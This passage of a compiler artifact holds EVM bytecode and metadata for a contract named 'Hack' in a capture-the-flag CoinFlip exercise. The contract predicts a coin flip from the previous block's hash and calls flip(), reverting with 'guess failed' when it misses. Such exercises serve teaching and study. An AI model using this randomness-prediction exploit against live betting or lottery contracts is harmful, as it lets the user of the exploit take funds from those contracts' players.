NUMBER PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x298 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP PUSH0 DUP1 SLOAD DUP3 PUSH2 0x13F SWAP2 SWAP1 PUSH2 0x2F8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x150 JUMPI PUSH0 PUSH2 0x153 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x172 DUP2 PUSH2 0x15E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x18B PUSH0 DUP4 ADD DUP5 PUSH2 0x169 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x19E DUP2 PUSH2 0x15E JUMP JUMPDEST DUP2 EQ PUSH2 0x1A8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x1B9 DUP2 PUSH2 0x195 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1D4 JUMPI PUSH2 0x1D3 PUSH2 0x191 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1E1 DUP5 DUP3 DUP6 ADD PUSH2 0x1AB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6775657373206661696C65640000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x22E PUSH1 0xC DUP4 PUSH2 0x1EA JUMP JUMPDEST SWAP2 POP PUSH2 0x239 DUP3 PUSH2 0x1FA JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x25B DUP2 PUSH2 0x222 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x2A2 DUP3 PUSH2 0x262 JUMP JUMPDEST SWAP2 POP PUSH2 0x2AD DUP4 PUSH2 0x262 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x2C5 JUMPI PUSH2 0x2C4 PUSH2 0x26B JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x302 DUP3 PUSH2 0x262 JUMP JUMPDEST SWAP2 POP PUSH2 0x30D DUP4 PUSH2 0x262 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x31D JUMPI PUSH2 0x31C PUSH2 0x2CB JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP9 TLOAD ADDMOD 0xC8 0x21 0xE9 0xC3 GASLIMIT CREATE2 XOR MOD SWAP5 0x4C STOP PUSH23 0x69EB4B173ECF80FBE61A30C9A8611A3D464736F6C6343 STOP ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "172400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"flip()": "infinite"
					},
					"internal": {
						"_guess()": "infinite"
					}
				},
				"methodIdentifiers": {
					"flip()": "cde4efa9"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "CTF/contracts/CoinFlip.sol:Hack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}